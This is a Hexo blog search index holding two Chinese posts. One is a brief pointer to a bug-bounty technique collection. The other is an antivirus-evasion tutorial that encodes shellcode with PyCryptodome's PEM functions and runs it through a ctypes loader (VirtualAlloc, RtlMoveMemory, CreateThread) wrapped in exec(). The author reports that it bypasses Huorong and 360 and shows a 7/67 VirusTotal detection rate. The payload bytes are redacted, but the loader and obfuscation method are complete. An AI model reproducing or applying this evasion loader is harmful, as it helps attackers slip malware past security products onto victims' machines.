<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SRC姿势(一)</title>
      <link href="/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/"/>
      <url>/2022/04/14/SRC%E5%A7%BF%E5%8A%BF(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="SRC姿势-一"><a href="#SRC姿势-一" class="headerlink" title="SRC姿势(一)"></a>SRC姿势(一)</h1><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204141050517.png"></p><p>github地址：<a href="https://github.com/LiAoRJ/src">LiAoRJ&#x2F;src: SRC姿势收集 (github.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> SRC姿势 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SRC姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀研究（1）Python加密混淆shellcode</title>
      <link href="/2022/04/13/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6%EF%BC%881%EF%BC%89Python%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86shellcode/"/>
      <url>/2022/04/13/%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6%EF%BC%881%EF%BC%89Python%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86shellcode/</url>
      
        <content type="html"><![CDATA[<h1 id="免杀研究（1）Python加密混淆shellcode"><a href="#免杀研究（1）Python加密混淆shellcode" class="headerlink" title="免杀研究（1）Python加密混淆shellcode"></a>免杀研究（1）Python加密混淆shellcode</h1><p>加密的方式有很多，例如Xor异或，Base64等等，其实加密算法不重要，重要的是一定要加密，本文将使用Python利用PyCrypto库对shellcode进行混淆测试。</p><h2 id="pycryptodome"><a href="#pycryptodome" class="headerlink" title="pycryptodome"></a>pycryptodome</h2><p>PyCryptodome 是 PyCrypto 的一个分支。这是一个跟密码学相关的模块，可以实现各种加密方式的加解密。<br><strong>官方文档：</strong><a href="https://pycryptodome.readthedocs.io/en/latest/src/introduction.html">https://pycryptodome.readthedocs.io/en/latest/src/introduction.html</a><br><strong>安装</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome -i https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure><p><strong>API</strong></p><table><thead><tr><th>Package</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/cipher/cipher.html">Crypto.Cipher</a></td><td>用于加密和解密数据（例如：AES）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/signature/signature.html">Crypto.Signature</a></td><td>用于创建和验证消息的数字签名  （例如：PKCS#1 v1.5）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/hash/hash.html">Crypto.Hash</a></td><td>用于创建加密 <strong>摘要</strong>  （例如：SHA-256）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/public_key/public_key.html">Crypto.PublicKey</a></td><td>用于生成、导出或导入的模块  <em>公钥</em> （例如：RSA 或 ECC）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/protocol/protocol.html">Crypto.Protocol</a></td><td>促进安全通信的模块 各方之间，在大多数情况下通过利用密码原语 来自其他模块。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/io/io.html">Crypto.IO</a></td><td>处理常用编码的模块 用于加密数据（例如：PEM）。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/random/random.html">Crypto.Random</a></td><td>用于生成随机数据的模块。</td></tr><tr><td><a href="https://pycryptodome.readthedocs.io/en/latest/src/util/util.html">Crypto.Util</a></td><td>通用（例如：XOR for byte 字符串）。</td></tr></tbody></table><h3 id="Crypto-IO-PEM"><a href="#Crypto-IO-PEM" class="headerlink" title="Crypto.IO.PEM"></a>Crypto.IO.PEM</h3><p>根据 PEM 格式封装数据的一组函数。</p><p>PEM（隐私增强邮件）是 IETF 标准，用于通过公钥基础设施保护电子邮件。它在 RFC 1421-1424 中指定。即使它已被放弃，它定义的简单消息封装今天仍然广泛用于将二进制加密对象（如密钥和证书）编码为文本。</p><p><strong>Crypto.IO.PEM.encode &amp; Crypto.IO.PEM.decode</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.IO <span class="keyword">import</span> PEM</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment"># passphrase：可以指定密钥</span></span><br><span class="line"><span class="comment"># marker：自己指定名称</span></span><br><span class="line">buf = PEM.encode(buf, marker=<span class="string">&quot;shellcode&quot;</span>, passphrase=<span class="literal">None</span>, randfunc=<span class="literal">None</span>)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">PEM.decode(buf, passphrase=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> Crypto.IO <span class="keyword">import</span> PEM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密后的shellcode</span></span><br><span class="line">buf = <span class="string">&quot;&quot;&quot; &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(PEM.decode(buf, passphrase=<span class="literal">None</span>)[<span class="number">0</span>])</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>执行上线试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> Crypto.IO <span class="keyword">import</span> PEM</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line"><span class="comment">#buf = b&quot;&quot;</span></span><br><span class="line"><span class="comment">#passphrase：可以指定密钥</span></span><br><span class="line"><span class="comment">#marker：自己指定名称</span></span><br><span class="line"><span class="comment"># buf = PEM.encode(buf, marker=&quot;shellcode&quot;, passphrase=None, randfunc=None)</span></span><br><span class="line"><span class="comment"># print(buf)</span></span><br><span class="line"><span class="comment">#加密后</span></span><br><span class="line">buf = <span class="string">&quot;&quot;&quot;-----BEGIN shellcode-----</span></span><br><span class="line"><span class="string">XXXXX</span></span><br><span class="line"><span class="string">-----END shellcode-----&quot;&quot;&quot;</span></span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(PEM.decode(buf, passphrase=<span class="literal">None</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#execode加密前</span></span><br><span class="line"><span class="comment"># execode = PEM.encode(b&quot;&quot;&quot;ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span></span><br><span class="line"><span class="comment"># ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span></span><br><span class="line"><span class="comment"># buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></span><br><span class="line"><span class="comment"># ctypes.windll.kernel32.RtlMoveMemory(</span></span><br><span class="line"><span class="comment">#     ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="comment">#     buf,</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(len(shellcode))</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># handle = ctypes.windll.kernel32.CreateThread(</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.c_uint64(ptr),</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.c_int(0),</span></span><br><span class="line"><span class="comment">#     ctypes.pointer(ctypes.c_int(0))</span></span><br><span class="line"><span class="comment"># )</span></span><br><span class="line"><span class="comment"># ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;, marker=&quot;execcute code&quot;,</span></span><br><span class="line"><span class="comment">#                  passphrase=None, randfunc=None))</span></span><br><span class="line"><span class="comment">#execode加密后</span></span><br><span class="line">execode=<span class="string">&quot;&quot;&quot;-----BEGIN execcute code-----</span></span><br><span class="line"><span class="string">XXXXX</span></span><br><span class="line"><span class="string">-----END execcute code-----&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(PEM.decode(execode, passphrase=<span class="literal">None</span>)[<span class="number">0</span>].decode())</span><br><span class="line"><span class="built_in">exec</span>(PEM.decode(execode, passphrase=<span class="literal">None</span>)[<span class="number">0</span>].decode())</span><br></pre></td></tr></table></figure><p>这里我封装成exe测试下上线，可绕过火绒、360执行命令,如下图。</p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204131635439.png"></p><p>virustotal查杀率7&#x2F;67 <strong>(测试时间2022年4月13日)</strong></p><p><img src="https://cdn.jsdelivr.net/gh/LiAoRJ/pic/202204131635472.png"></p><p>本文参考自<a href="https://xz.aliyun.com/t/10999">免杀之代码混淆 - 先知社区 (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀研究 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
